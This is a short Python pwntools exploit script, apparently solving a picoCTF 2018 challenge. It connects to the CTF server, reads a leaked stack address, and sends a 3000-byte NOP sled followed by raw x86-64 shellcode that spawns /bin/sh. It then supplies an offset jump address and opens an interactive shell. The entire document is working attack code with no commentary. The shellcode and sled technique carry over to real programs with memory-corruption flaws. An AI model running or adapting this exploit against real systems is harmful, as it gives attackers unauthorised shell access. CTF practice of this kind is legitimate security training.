from pwn import *

sh = remote("2018shell.picoctf.com",24627)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = "\x90"*3000 + shellcode 
sh.recvuntil("position: ")
current = sh.recvline().strip().decode()
start = (int(current,16)+1000)
sh.sendline(payload)
sh.sendline(hex(start))
sh.interactive()
#print(current,hex(start))
